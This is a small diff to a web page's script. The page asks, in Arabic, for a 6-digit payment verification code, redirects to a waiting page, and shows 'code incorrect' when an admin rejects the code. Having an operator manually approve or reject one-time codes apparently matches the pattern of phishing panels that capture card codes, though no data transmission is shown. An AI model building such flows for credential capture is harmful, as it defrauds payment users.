@@ -148,8 +148,22 @@
 			if(msg){msg.hidden=false; msg.textContent="يرجى إدخال رمز التحقق المكون من 6 أرقام.";}
 			return;
 		}
+		sessionStorage.setItem('wait-source', 'payment-verify');
 		window.location.assign("wait.html");
 	});
+
+	// Check for rejection error from admin
+	var pageErr = sessionStorage.getItem('page-error');
+	if (pageErr) {
+		sessionStorage.removeItem('page-error');
+		if(msg){
+			msg.hidden=false;
+			msg.style.color='#dc2626';
+			msg.style.fontSize='15px';
+			msg.style.fontWeight='700';
+			msg.textContent='الرمز غير صحيح';
+		}
+	}
 })();
 </script>
 </body>
